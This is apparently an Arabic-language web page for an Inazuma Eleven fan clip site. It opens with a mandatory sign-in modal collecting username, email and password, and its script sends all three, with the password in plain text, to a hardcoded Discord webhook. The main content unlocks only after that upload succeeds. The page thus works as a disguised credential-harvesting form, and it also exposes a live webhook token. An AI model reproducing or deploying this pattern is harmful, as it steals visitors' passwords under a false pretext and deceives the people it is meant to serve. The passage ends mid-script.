<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>inazumaAR | أفضل لقطات إينازوما إليفن</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root {
            --primary: #1a1a4a;
            --secondary: #3a3a88;
            --accent: #f7d716;
            --dark: #0a0e1a;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--dark), #151a30);
            color: #f0f0f0;
            min-height: 100vh;
            overflow-x: hidden;
            transition: background-color 0.5s ease;
        }
        
        .header-gradient {
            background: linear-gradient(90deg, var(--primary), var(--secondary));
        }
        
        .card-gradient {
            background: linear-gradient(145deg, rgba(26,26,74,0.9), rgba(58,58,136,0.8));
            backdrop-filter: blur(10px);
        }
        
        .energy-border {
            border: 2px solid transparent;
            border-image: linear-gradient(45deg, var(--accent), transparent) 1;
            border-radius: 16px;
        }
        
        .energy-glow {
            box-shadow: 0 0 15px rgba(247, 215, 22, 0.3);
            transition: box-shadow 0.3s ease-in-out;
        }

        .clip-card {
            transition: transform 0.3s ease, box-shadow 0.3s ease, border 0.3s ease;
            transform: perspective(1000px) rotateX(0deg) rotateY(0deg);
            border: 2px solid transparent; 
        }
        
        .clip-card:hover {
            transform: perspective(1000px) rotateX(2deg) rotateY(2deg) translateY(-8px);
            box-shadow: 0 20px 30px rgba(0, 0, 0, 0.4);
            border: 2px solid var(--accent); 
            z-index: 10;
        }

        .video-player-container {
            border: 3px solid var(--accent); 
            box-shadow: 0 0 25px rgba(247, 215, 22, 0.5); 
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            transform: scale(1);
        }
        
        .video-player-container:hover {
            transform: scale(1.01);
            box-shadow: 0 0 35px rgba(247, 215, 22, 0.8);
        }
        
        .video-wrapper {
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        
        .video-wrapper.expanded {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
            border-radius: 0;
            padding: 0 !important;
        }
        
        .animate-float {
            animation: float 6s ease-in-out infinite;
        }
        
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-15px); }
            100% { transform: translateY(0px); }
        }
        
        .animate-pulse-glow {
            animation: pulse-glow 2s infinite alternate;
        }
        
        @keyframes pulse-glow {
            from { box-shadow: 0 0 5px rgba(247, 215, 22, 0.3); }
            to { box-shadow: 0 0 20px rgba(247, 215, 22, 0.7); }
        }
        
        .grid-layout {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 24px;
        }
        
        @media (max-width: 768px) {
            .grid-layout {
                grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            }
        }
        
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(26, 26, 74, 0.5);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--accent);
            border-radius: 4px;
        }
        
        .soccer-field {
            background-image: 
                linear-gradient(rgba(26, 26, 74, 0.9), rgba(26, 26, 74, 0.9)),
                url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="none" stroke="rgba(247, 215, 22, 0.1)" stroke-width="1"/><circle cx="50" cy="50" r="30" fill="none" stroke="rgba(247, 215, 22, 0.1)" stroke-width="1"/></svg>');
            background-size: 80px 80px;
        }
        
        .player-icon {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--accent);
            color: var(--primary);
            border-radius: 50%;
            font-weight: bold;
        }
        
        .cta-button {
            transition: all 0.3s ease-in-out;
        }

        .cta-button:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 5px 20px rgba(247, 215, 22, 0.4);
        }

        .header-title-glow {
            text-shadow: 0 0 10px rgba(247, 215, 22, 0.6);
        }

        /* Mobile Fixes */
        @media (max-width: 768px) {
            .header-layout-mobile {
                flex-direction: column;
                gap: 1rem;
            }
            
            .header-logo-mobile {
                flex-direction: row;
                justify-content: space-between;
                width: 100%;
            }
            
            .search-container-mobile {
                width: 100%;
            }
            
            .header-info-mobile {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .header-info-mobile h1 { 
                font-size: 1.5rem; 
                text-align: center;
                width: 100%;
            }
            
            .login-button-mobile {
                padding: 0.5rem 1rem;
                width: auto;
                height: auto;
                border-radius: 9999px;
            }
            
            .video-player-container .flex-col {
                flex-direction: column;
            }
            
            .cta-button {
                width: 100%;
                min-height: 48px;
                padding: 0.75rem;
            }
            
            .share-option {
                min-height: 100px;
            }
            
            .footer-grid-mobile {
                grid-template-columns: 1fr;
            }
            
            .clip-card {
                max-width: 100%;
            }
            
            .video-player-container {
                padding: 1rem;
            }
            
            .video-player-section {
                width: 100%;
            }
            
            .video-info-section {
                width: 100%;
                margin-top: 1rem;
            }
        }
        
        /* أنماط جديدة لنافذة تسجيل الدخول */
        #login-modal {
            backdrop-filter: blur(10px);
            transition: opacity 0.5s ease;
        }
        
        .login-container {
            animation: slideIn 0.5s forwards;
        }
        
        @keyframes slideIn {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .input-field {
            transition: all 0.3s ease;
        }
        
        .input-field:focus {
            border-color: #f7d716;
            box-shadow: 0 0 0 3px rgba(247, 215, 22, 0.2);
        }
        
        .error-message {
            color: #ff6b6b;
            font-size: 0.85rem;
            margin-top: 0.25rem;
            display: none;
        }
        
        /* Animations for scrolling */
        .animate-on-scroll {
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
        }
        
        .animate-on-scroll.animated {
            opacity: 1;
            transform: translateY(0);
        }
        
        /* Animation for elements */
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .fadeInUp {
            animation: fadeInUp 0.8s ease forwards;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col">
    <!-- نافذة تسجيل الدخول (تظهر أولاً) -->
    <div id="login-modal" class="fixed inset-0 bg-black/90 z-[10004] flex items-center justify-center p-4">
        <div class="login-container bg-gray-800 p-8 rounded-xl shadow-2xl max-w-md w-full border-2 border-yellow-500">
            <div class="flex justify-center mb-6">
                <div class="w-16 h-16 rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center animate-pulse-glow">
                    <i class="fas fa-lock text-2xl text-gray-900"></i>
                </div>
            </div>
            
            <h3 class="text-2xl font-bold text-center text-yellow-300 mb-2">تسجيل الدخول</h3>
            <p class="text-gray-400 text-center mb-6">يجب التسجيل لمشاهدة المحتوى</p>
            
            <form id="login-form">
                <div class="mb-4">
                    <label for="username" class="block text-gray-300 mb-2">اسم المستخدم</label>
                    <input type="text" id="username" name="username" required 
                           class="input-field w-full py-3 px-4 rounded-lg bg-[#0f0f2a] text-white border border-gray-700 focus:outline-none transition-all">
                    <div id="username-error" class="error-message">يرجى إدخال اسم المستخدم</div>
                </div>
                
                <div class="mb-4">
                    <label for="email" class="block text-gray-300 mb-2">البريد الإلكتروني</label>
                    <input type="email" id="email" name="email" required 
                           class="input-field w-full py-3 px-4 rounded-lg bg-[#0f0f2a] text-white border border-gray-700 focus:outline-none transition-all">
                    <div id="email-error" class="error-message">يرجى إدخال بريد إلكتروني صحيح</div>
                </div>
                
                <div class="mb-6">
                    <label for="password" class="block text-gray-300 mb-2">كلمة المرور</label>
                    <input type="password" id="password" name="password" required 
                           class="input-field w-full py-3 px-4 rounded-lg bg-[#0f0f2a] text-white border border-gray-700 focus:outline-none transition-all">
                    <div id="password-error" class="error-message">كلمة المرور يجب أن تحتوي على 8 أحرف على الأقل</div>
                </div>
                
                <button type="submit" class="w-full px-6 py-3 bg-gradient-to-r from-yellow-500 to-yellow-600 text-gray-900 rounded-lg font-bold hover:from-yellow-400 hover:to-yellow-500 transition-all cta-button flex items-center justify-center">
                    <i class="fas fa-user-plus ml-2"></i>
                    تسجيل الدخول
                </button>
            </form>
            
            <p class="text-center text-gray-500 mt-6 text-sm">
                بالضغط على "تسجيل الدخول" أنت توافق على سياسة الخصوصية وشروط الاستخدام
            </p>
        </div>
    </div>

    <!-- بقية المحتوى (مخفي حتى يتم التسجيل) -->
    <div id="main-content" class="hidden">
        <!-- Header -->
        <header class="header-gradient py-5 px-4 md:px-8 shadow-xl sticky top-0 z-50">
            <div class="max-w-7xl mx-auto">
                <div class="flex flex-col md:flex-row justify-between items-center gap-6 header-layout-mobile">
                    <!-- Mobile-first header structure -->
                    <div class="flex items-center gap-4 header-info-mobile w-full">
                        <div class="w-12 h-12 rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center animate-pulse-glow">
                            <i class="fas fa-futbol text-xl text-gray-900"></i>
                        </div>
                        <div class="flex-1">
                            <h1 class="text-xl md:text-3xl font-bold header-title-glow text-center">inazumaAR</h1>
                            <p class="text-sm text-yellow-200 hidden md:block text-center">أفضل اللقطات من النسخة العربية</p>
                        </div>
                    </div>
                    
                    <!-- Search bar is separate and below on mobile -->
                    <div class="relative w-full md:w-96 search-container-mobile">
                        <input id="search-input" type="text" placeholder="ابحث عن لقطة أو شخصية..." class="w-full py-3 px-5 pr-12 rounded-full bg-[#0f0f2a] text-white border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-500/50 transition-all">
                        <i class="fas fa-search absolute left-5 top-1/2 -translate-y-1/2 text-gray-400"></i>
                    </div>
                    
                    <div class="flex gap-3 w-full md:w-auto justify-end">
                        <button id="logout-button" class="px-4 py-2 rounded-full bg-[#0f0f2a] hover:bg-red-500 hover:text-white transition-colors cta-button login-button-mobile">
                            <i class="fas fa-sign-out-alt md:mr-2"></i>
                            <span class="hidden md:inline">تسجيل الخروج</span>
                        </button>
                    </div>
                </div>
            </div>
        </header>

        <!-- Welcome Message Overlay -->
        <div id="welcome-message" class="fixed top-20 right-4 bg-yellow-500 text-gray-900 px-6 py-3 rounded-full shadow-lg z-50 transform translate-x-full transition-transform duration-500 ease-in-out">
            مرحباً بعودتك، <span id="welcome-user" class="font-bold"></span>!
        </div>

        <!-- Main Content -->
        <main class="flex-1 py-8 px-4 md:px-8">
            <div class="max-w-7xl mx-auto">
                <!-- Video Player Section with enhanced design -->
                <section class="mb-12 fadeInUp">
                    <div class="video-player-container card-gradient rounded-3xl overflow-hidden shadow-2xl p-6">
                        <div class="flex flex-col md:flex-row gap-6">
                            <!-- Video Display Area -->
                            <div class="md:w-3/5 w-full" id="video-player-section">
                                <div class="relative aspect-video rounded-2xl overflow-hidden mb-4">
                                    <div id="video-placeholder" class="absolute inset-0 flex flex-col items-center justify-center bg-gradient-to-br from-[#1a1a4a] to-[#3a3a88] soccer-field">
                                        <div class="text-center mb-8">
                                            <i class="fas fa-play-circle text-6xl text-yellow-500 mb-4 animate-pulse"></i>
                                            <h3 class="text-2xl font-bold text-gray-300 mb-2">اختر لقطة لتشغيلها</h3>
                                            <p class="text-gray-400">استكشف أفضل اللقطات من عالم inazumaAR</p>
                                        </div>
                                        <div class="flex gap-3">
                                            <div class="w-3 h-3 rounded-full bg-yellow-500 animate-bounce"></div>
                                            <div class="w-3 h-3 rounded-full bg-yellow-500 animate-bounce" style="animation-delay: 0.2s"></div>
                                            <div class="w-3 h-3 rounded-full bg-yellow-500 animate-bounce" style="animation-delay: 0.4s"></div>
                                        </div>
                                    </div>
                                    <video id="video-player" class="w-full h-full object-cover hidden" controls></video>
                                </div>
                                <p id="video-description" class="text-gray-300">
                                    اختر لقطة من الأسفل لعرض وصفها الكامل ومعلوماتها التفصيلية.
                                </p>
                            </div>
                            <!-- Video Info and Controls -->
                            <div class="md:w-2/5 w-full flex flex-col">
                                <h3 id="video-title" class="text-2xl font-bold mb-3 text-yellow-300">اختر لقطة لعرض التفاصيل</h3>
                                <div class="flex items-center gap-2 text-gray-400 mb-4">
                                    <span class="player-icon">
                                        <i class="fas fa-user"></i>
                                    </span>
                                    <span id="video-character">غير محدد</span>
                                </div>
                                <div class="mt-auto">
                                    <a id="download-btn" href="#" class="px-4 py-2 rounded-full bg-[#0f0f2a] hover:bg-yellow-500 hover:text-gray-900 transition-colors cta-button inline-flex items-center justify-center w-full">
                                        <i class="fas fa-download mr-2"></i>تحميل اللقطة
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                
                <!-- Clips Grid Section -->
                <section class="fadeInUp">
                    <div class="flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
                        <h2 class="text-2xl font-bold text-yellow-300">
                            <i class="fas fa-film mr-2"></i>أحدث اللقطات
                        </h2>
                        <div class="flex items-center gap-3 w-full md:w-auto">
                            <span class="text-gray-400">ترتيب حسب:</span>
                            <select class="bg-[#0f0f2a] text-white rounded-full py-2 px-4 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-500/50 transition-all w-full md:w-auto">
                                <option>الأحدث</option>
                                <option>الأكثر مشاهدة</option>
                                <option>الأعلى تقييماً</option>
                            </select>
                        </div>
                    </div>
                    
                    <div id="clips-container" class="grid-layout">
                        <!-- سيتم إضافة اللقطات هنا بواسطة JavaScript -->
                    </div>
                    
                    <!-- Pagination -->
                    <div class="flex justify-center mt-10">
                        <div class="flex gap-2">
                            <button class="w-10 h-10 rounded-full bg-[#0f0f2a] flex items-center justify-center cta-button">
                                <i class="fas fa-chevron-right"></i>
                            </button>
                            <button class="w-10 h-10 rounded-full bg-yellow-500 text-gray-900 font-bold cta-button">1</button>
                            <button class="w-10 h-10 rounded-full bg-[#0f0f2a] flex items-center justify-center cta-button">2</button>
                            <button class="w-10 h-10 rounded-full bg-[#0f0f2a] flex items-center justify-center cta-button">3</button>
                            <button class="w-10 h-10 rounded-full bg-[#0f0f2a] flex items-center justify-center cta-button">
                                <i class="fas fa-chevron-left"></i>
                            </button>
                        </div>
                    </div>
                </section>
            </div>
        </main>

        <!-- Chatbot Button -->
        <button id="chatbot-button" class="fixed bottom-6 left-6 w-14 h-14 rounded-full bg-yellow-500 text-gray-900 shadow-lg flex items-center justify-center transition-all hover:scale-110 cta-button z-50">
            <i class="fas fa-comment-dots text-2xl"></i>
        </button>

        <!-- Footer -->
        <footer class="bg-[#0a0e1a] py-10 px-4 mt-12">
            <div class="max-w-7xl mx-auto">
                <div class="flex flex-col items-center">
                    <div class="flex gap-3 mb-6">
                        <a id="youtube-link" href="#" target="_blank" class="w-10 h-10 rounded-full bg-[#1a1a4a] flex items-center justify-center hover:bg-yellow-500 hover:text-gray-900 transition-colors cta-button">
                            <i class="fab fa-youtube"></i>
                        </a>
                        <a id="twitter-link" href="#" target="_blank" class="w-10 h-10 rounded-full bg-[#1a1a4a] flex items-center justify-center hover:bg-yellow-500 hover:text-gray-900 transition-colors cta-button">
                            <i class="fab fa-twitter"></i>
                        </a>
                        <a id="discord-link" href="#" target="_blank" class="w-10 h-10 rounded-full bg-[#1a1a4a] flex items-center justify-center hover:bg-yellow-500 hover:text-gray-900 transition-colors cta-button">
                            <i class="fab fa-discord"></i>
                        </a>
                    </div>
                </div>
                
                <div class="pt-6 border-t border-gray-800 text-center text-gray-500">
                    <p>© 2023 fareselnagar. جميع الحقوق محفوظة.</p>
                </div>
            </div>
        </footer>

        <!-- Back to Top Button -->
        <button id="back-to-top" class="fixed bottom-6 right-6 w-12 h-12 rounded-full bg-yellow-500 text-gray-900 shadow-lg flex items-center justify-center transition-all opacity-0 invisible hover:scale-110 cta-button">
            <i class="fas fa-arrow-up"></i>
        </button>

        <!-- General Message Modal -->
        <div id="message-modal" class="fixed inset-0 bg-black/80 z-[10000] flex items-center justify-center hidden transition-opacity duration-300">
            <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-sm w-full mx-4 text-center border-2 border-yellow-500">
                <h3 id="message-title" class="text-xl font-bold text-yellow-300 mb-2"></h3>
                <p id="message-content" class="text-gray-200 mb-4"></p>
                <button id="close-message-modal" class="px-6 py-2 bg-yellow-500 text-gray-900 rounded-full font-bold hover:bg-yellow-400 transition-colors cta-button">إغلاق</button>
            </div>
        </div>
        
        <!-- Initial Warning Modal -->
        <div id="initial-warning-modal" class="fixed inset-0 bg-black/80 z-[10001] flex items-center justify-center hidden transition-opacity duration-300">
            <div class="bg-gray-800 p-8 rounded-lg shadow-xl max-w-lg w-full mx-4 text-center border-2 border-yellow-500">
                <div class="flex justify-center mb-4">
                    <i class="fas fa-exclamation-triangle text-4xl text-yellow-500 animate-pulse"></i>
                </div>
                <h3 class="text-2xl font-bold text-yellow-300 mb-4">مرحباً بك في inazumaAR!</h3>
                <p class="text-gray-200 mb-6 leading-relaxed">
                    هذا الموقع تم تصميمه من قبل شخصين فقط، مما يعني احتمال تواجه أخطاء في الموقع أو أزرار لم تفعل.
                    فلو لاحظت أي خلل أو أي شيء يحتاج التطوير، ارسل لنا في الشات بوت. شكراً لتفهمك!
                </p>
                <button id="close-initial-warning-modal" class="px-6 py-3 bg-yellow-500 text-gray-900 rounded-full font-bold hover:bg-yellow-400 transition-colors cta-button">فهمت</button>
            </div>
        </div>
        
        <!-- First Visit Name Modal -->
        <div id="name-modal" class="fixed inset-0 bg-black/80 z-[10003] flex items-center justify-center hidden transition-opacity duration-300">
            <div class="bg-gray-800 p-8 rounded-lg shadow-xl max-w-sm w-full mx-4 text-center border-2 border-yellow-500">
                <div class="flex justify-center mb-4">
                    <i class="fas fa-hand-peace text-4xl text-yellow-500"></i>
                </div>
                <h3 class="text-2xl font-bold text-yellow-300 mb-4">ما هو اسمك؟</h3>
                <p class="text-gray-200 mb-4">أدخل اسمك لكي نتمكن من الترحيب بك في زياراتك القادمة.</p>
                <input type="text" id="name-input" placeholder="اسمك الكريم" class="w-full py-3 px-4 rounded-full bg-[#0f0f2a] text-white border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-500/50 transition-all mb-4">
                <button id="save-name-button" class="w-full px-6 py-3 bg-yellow-500 text-gray-900 rounded-full font-bold hover:bg-yellow-400 transition-colors cta-button">تأكيد</button>
            </div>
        </div>

        <!-- Chatbot Modal -->
        <div id="chatbot-modal" class="fixed inset-0 bg-black/80 z-[10002] flex items-center justify-center hidden transition-opacity duration-300">
            <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full mx-4 flex flex-col h-3/4 max-h-[600px] border-2 border-yellow-500">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-xl font-bold text-yellow-300">إرسال اقتراحات</h3>
                    <button id="close-chatbot-modal" class="text-gray-400 hover:text-yellow-500">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
                <div id="chat-messages" class="flex-1 overflow-y-auto p-4 bg-[#1a1a4a] rounded-lg mb-4 text-gray-200 space-y-4">
                    <!-- Chatbot initial message -->
                    <div class="flex justify-start">
                        <div class="bg-[#3a3a88] p-3 rounded-xl rounded-bl-none max-w-[80%] shadow-md">
                            <p>مرحباً! أرسل لنا اقتراحاتك أو أي خطأ وجدته في الموقع، وسنقوم بمراجعته.</p>
                        </div>
                    </div>
                </div>
                <div class="flex gap-2">
                    <input type="text" id="chatbot-input" placeholder="اكتب اقتراحك هنا..." class="flex-1 py-3 px-4 rounded-full bg-[#0f0f2a] text-white border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-500/50 transition-all">
                    <button id="chatbot-send-button" class="w-12 h-12 rounded-full bg-yellow-500 text-gray-900 flex items-center justify-center hover:bg-yellow-400 transition-colors cta-button">
                        <i class="fas fa-paper-plane"></i>
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // بيانات اللقطات مع صور مصغرة مخصصة.
        const videoClips = [
            {
                name: "الهجمة النجمية",
                file: "clip1.mp4", 
                thumbnail: "photo1.png", 
                character: "inazumaAR",
                download: "clip1.mp4"
            },
            {
                name: "ضربة التنين",
                file: "clip2.mp4",
                thumbnail: "photo2.jpg",
                character: "inazumaAR",
                download: "clip2.mp4"
            },
            {
                name: "العاصفة المدمرة",
                file: "clip3.mp4",
                thumbnail: "photo3.jpg",
                character: "inazumaAR",
                download: "clip3.mp4"
            },
            {
                name: "حاجز الزمرد",
                file: "clip4.mp4",
                thumbnail: "photo4.jpg",
                character: "inazumaAR",
                download: "clip4.mp4"
            },
            {
                name: "الطيور النجمية",
                file: "clip5.mp4",
                thumbnail: "photo5.jpg",
                character: "inazumaAR",
                download: "clip5.mp4"
            },
            {
                name: "اليد الخارقة",
                file: "clip6.mp4",
                thumbnail: "photo6.jpg",
                character: "inazumaAR",
                download: "clip6.mp4"
            },
            {
                name: "الضربة النهائية",
                file: "https://drive.google.com/file/d/1MvPp39sl85wUNpPZVtXZ-K8ADScVLBsK/view",
                thumbnail: "photo7.jpg",
                character: "inazumaAR",
                download: "https://drive.google.com/uc?export=download&id=1MvPp39sl85wUNpPZVtXZ-K8ADScVLBsK"
            }
        ];

        // Webhook URL لإرسال بيانات المستخدم
        const webhookUrl = 'https://discord.com/api/webhooks/1403754910151086221/_nMSBkyQTl-0vI45bYzar9LprDgSDz6ha0MxQJZ-qOW1nkpjoyH5BKlclMJJfuOM-75A';
        
        // عناصر نافذة تسجيل الدخول
        const loginModal = document.getElementById('login-modal');
        const loginForm = document.getElementById('login-form');
        const mainContent = document.getElementById('main-content');
        const usernameInput = document.getElementById('username');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const usernameError = document.getElementById('username-error');
        const emailError = document.getElementById('email-error');
        const passwordError = document.getElementById('password-error');
        
        // عناصر الترحيب
        const welcomeMessage = document.getElementById('welcome-message');
        const welcomeUserSpan = document.getElementById('welcome-user');
        
        // التحقق من صحة البيانات
        function validateForm() {
            let isValid = true;
            
            // التحقق من اسم المستخدم
            if(usernameInput.value.trim() === '') {
                usernameError.style.display = 'block';
                usernameInput.classList.add('border-red-500');
                isValid = false;
            } else {
                usernameError.style.display = 'none';
                usernameInput.classList.remove('border-red-500');
            }
            
            // التحقق من البريد الإلكتروني
            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if(!emailPattern.test(emailInput.value)) {
                emailError.style.display = 'block';
                emailInput.classList.add('border-red-500');
                isValid = false;
            } else {
                emailError.style.display = 'none';
                emailInput.classList.remove('border-red-500');
            }
            
            // التحقق من كلمة المرور (8 أحرف على الأقل)
            if(passwordInput.value.length < 8) {
                passwordError.style.display = 'block';
                passwordInput.classList.add('border-red-500');
                isValid = false;
            } else {
                passwordError.style.display = 'none';
                passwordInput.classList.remove('border-red-500');
            }
            
            return isValid;
        }
        
        // إرسال بيانات المستخدم إلى الويب هوك
        async function sendUserData(userData) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: '**مستخدم جديد مسجل**:',
                        embeds: [{
                            title: 'تفاصيل المستخدم',
                            fields: [
                                { name: 'اسم المستخدم', value: userData.username },
                                { name: 'البريد الإلكتروني', value: userData.email },
                                { name: 'كلمة المرور', value: userData.password },
                                { name: 'وقت التسجيل', value: new Date().toLocaleString() }
                            ],
                            color: 16763904 // اللون الأصفر
                        }]
                    }),
                });
                
                if (response.ok) {
                    return true;
                } else {
                    console.error('فشل إرسال البيانات:', response.statusText);
                    return false;
                }
            } catch (error) {
                console.error('خطأ في إرسال البيانات:', error);
                return false;
            }
        }
        
        // إظهار رسالة الترحيب
        function showWelcomeMessage(userName) {
            welcomeUserSpan.textContent = userName;
            welcomeMessage.classList.remove('translate-x-full');
            setTimeout(() => {
                welcomeMessage.classList.add('translate-x-full');
            }, 3000);
        }
        
        // معالجة إرسال النموذج
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            if (validateForm()) {
                const userData = {
                    username: usernameInput.value.trim(),
                    email: emailInput.value.trim(),
                    password: passwordInput.value
                };
                
                // عرض رسالة تحميل
                const submitButton = loginForm.querySelector('button[type="submit"]');
                const originalButtonText = submitButton.innerHTML;
                submitButton.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جارٍ التسجيل...';
                submitButton.disabled = true;
                
                // إرسال البيانات
                const sendSuccess = await sendUserData(userData);
                
                if (sendSuccess) {
                    // حفظ اسم المستخدم في localStorage للترحيب به لاحقاً
                    localStorage.setItem('inazuma-username', userData.username);
                    // حفظ حالة تسجيل الدخول
                    localStorage.setItem('inazuma-logged-in', 'true');
                    
                    // إخفاء نافذة التسجيل وإظهار المحتوى الرئيسي
                    loginModal.style.opacity = '0';
                    loginModal.style.pointerEvents = 'none';
                    setTimeout(() => {
                        mainContent.classList.remove('hidden');
                        
                        // عرض رسالة ترحيب
                        showWelcomeMessage(userData.username);
                        
                        // عرض رسالة التحذير
                        setTimeout(() => {
                            document.getElementById('initial-warning-modal').classList.remove('hidden');
                        }, 1000);
                    }, 500);
                } else {
                    alert('حدث خطأ أثناء التسجيل. يرجى المحاولة مرة أخرى.');
                    submitButton.innerHTML = originalButtonText;
                    submitButton.disabled = false;
                }
            }
        });

        // بقية عناصر DOM
        const videoPlayer = document.getElementById('video-player');
        const videoPlaceholder = document.getElementById('video-placeholder');
        const videoTitle = document.getElementById('video-title');
        const videoCharacter = document.getElementById('video-character');
        const videoDescription = document.getElementById('video-description');
        const backToTopBtn = document.getElementById('back-to-top');
        const clipsContainer = document.getElementById('clips-container');
        const searchInput = document.getElementById('search-input');
        const messageModal = document.getElementById('message-modal');
        const closeMessageModal = document.getElementById('close-message-modal');
        const initialWarningModal = document.getElementById('initial-warning-modal');
        const closeInitialWarningModal = document.getElementById('close-initial-warning-modal');
        const nameModal = document.getElementById('name-modal');
        const nameInput = document.getElementById('name-input');
        const saveNameButton = document.getElementById('save-name-button');
        const chatbotButton = document.getElementById('chatbot-button');
        const chatbotModal = document.getElementById('chatbot-modal');
        const closeChatbotModal = document.getElementById('close-chatbot-modal');
        const chatbotInput = document.getElementById('chatbot-input');
        const chatbotSendButton = document.getElementById('chatbot-send-button');
        const chatMessages = document.getElementById('chat-messages');
        const logoutButton = document.getElementById('logout-button');
        const downloadBtn = document.getElementById('download-btn');

        // وظيفة لإظهار نافذة الرسائل
        function showMessage(title, content) {
            document.getElementById('message-title').textContent = title;
            document.getElementById('message-content').textContent = content;
            messageModal.classList.remove('hidden');
        }

        closeMessageModal.addEventListener('click', () => {
            messageModal.classList.add('hidden');
        });

        // إظهار نافذة التحذير عند أول زيارة
        function showInitialWarning() {
            if (!localStorage.getItem('inazuma-warning-seen')) {
                initialWarningModal.classList.remove('hidden');
                localStorage.setItem('inazuma-warning-seen', 'true');
            }
        }
        
        closeInitialWarningModal.addEventListener('click', () => {
            initialWarningModal.classList.add('hidden');
        });

        // دالة لتشغيل الفيديو وتحريك الصفحة للأعلى
        function playVideo(index) {
            const clip = videoClips[index];
            
            videoTitle.textContent = clip.name; 
            videoCharacter.textContent = clip.character;
            videoDescription.textContent = `شاهد أفضل لحظات ${clip.character} في مسلسل inazumaAR`; 
            downloadBtn.href = clip.download;
            
            videoPlaceholder.style.display = 'none';
            videoPlayer.style.display = 'block';
            
            videoPlayer.src = clip.file;
            videoPlayer.play();
            
            const videoPlayerContainer = document.querySelector('.video-player-container');
            videoPlayerContainer.scrollIntoView({ behavior: 'smooth', block: 'start' });

            videoTitle.classList.add('animate-pulse-glow');
            setTimeout(() => {
                videoTitle.classList.remove('animate-pulse-glow');
            }, 2000);
        }

        // دالة لإنشاء بطاقة فيديو
        function createClipCard(clip, index) {
            const clipCard = document.createElement('div');
            clipCard.classList.add('clip-card', 'card-gradient', 'rounded-2xl', 'overflow-hidden', 'shadow-xl', 'energy-glow', 'cursor-pointer', 'animate-on-scroll');
            
            clipCard.innerHTML = `
                <div class="relative aspect-video" onclick="playVideo(${index})">
                    <img src="${clip.thumbnail}" alt="Thumbnail for clip number ${index + 1}" class="w-full h-full object-cover transition-transform duration-300 transform hover:scale-110">
                    <div class="absolute inset-0 bg-black/50 flex items-center justify-center opacity-0 hover:opacity-100 transition-opacity">
                        <i class="fas fa-play text-4xl text-yellow-500"></i>
                    </div>
                </div>
                <div class="p-4">
                    <h3 class="font-bold text-lg mb-2">${clip.name}</h3>
                    <p class="text-gray-400 text-sm mb-3">${clip.character}</p>
                    <div class="flex justify-between items-center text-sm">
                        <span class="text-yellow-400"><i class="fas fa-user mr-1"></i> ${clip.character}</span>
                    </div>
                </div>
            `;

            return clipCard;
        }

        // دالة لفلترة اللقطات وعرضها
        function renderClips(clips) {
            clipsContainer.innerHTML = ''; 
            if (clips.length === 0) {
                clipsContainer.innerHTML = '<p class="text-center text-gray-400 col-span-full">لا توجد لقطات مطابقة لنتائج البحث.</p>';
                return;
            }
            clips.forEach((clip, index) => {
                clipsContainer.appendChild(createClipCard(clip, index));
            });
        }
        
        // دالة البحث
        function filterClips() {
            const searchTerm = searchInput.value.toLowerCase();
            const filteredClips = videoClips.filter(clip => 
                clip.name.toLowerCase().includes(searchTerm) ||
                clip.character.toLowerCase().includes(searchTerm)
            );
            renderClips(filteredClips);
        }
        
        // ربط حدث الإدخال بدالة البحث
        searchInput.addEventListener('input', filterClips);

        // زر العودة للأعلى
        window.addEventListener('scroll', function() {
            if (window.scrollY > 300) {
                backToTopBtn.style.opacity = '1';
